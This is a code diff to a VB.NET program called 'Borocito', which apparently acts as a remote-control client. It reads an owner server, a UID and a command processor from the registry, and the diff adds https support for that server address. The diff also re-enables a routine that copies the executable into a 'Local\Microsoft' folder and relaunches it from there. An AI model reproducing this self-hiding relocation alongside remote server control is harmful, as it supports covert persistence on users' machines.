@@ -8,7 +8,7 @@ Module GlobalUses
     Public HttpOwnerServer As String
     Public compileVersion As String = My.Application.Info.Version.ToString &
         " (" & Application.ProductVersion & ") " &
-        "[27/01/2023 22:40]" 'Indicacion exacta de la ultima compilacion
+        "[16/04/2023 18:12]" 'Indicacion exacta de la ultima compilacion
 End Module '<--- ACTUALIZAR DATOS
 Module Utility
     Public tlmContent As String
@@ -83,9 +83,16 @@ Module Memory
         Try
             AddToLog("LoadRegedit@Memory", "Loading data...", False)
             OwnerServer = regKey.GetValue("OwnerServer")
+            Dim httpPrefix As String = Nothing
+            If OwnerServer.StartsWith("https") Then
+                httpPrefix = "https://"
+            ElseIf OwnerServer.StartsWith("http") Then
+                httpPrefix = "http://"
+            End If
+            OwnerServer = OwnerServer.Replace(httpPrefix, Nothing)
             UID = regKey.GetValue("UID")
             MyCommandProcessor = regKey.GetValue("MyCommandProcessor")
-            HttpOwnerServer = "http://" & OwnerServer
+            HttpOwnerServer = httpPrefix & OwnerServer
         Catch ex As Exception
             AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
         End Try
@@ -163,15 +170,15 @@ Module StartUp
     End Sub
     Sub RunFromLocation()
         Try
-            'If Application.StartupPath.Contains("Local\Microsoft") = False Then
-            '    AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
-            '    If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
-            '        My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
-            '    End If
-            '    My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
-            '    Process.Start(DIRCommons & "\Borocito.exe", parameters)
-            '    Stopit()
-            'End If
+            If Application.StartupPath.Contains("Local\Microsoft") = False Then
+                AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
+                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
+                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
+                End If
+                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
+                Process.Start(DIRCommons & "\Borocito.exe", parameters)
+                Stopit()
+            End If
         Catch ex As Exception
             AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
         End Try
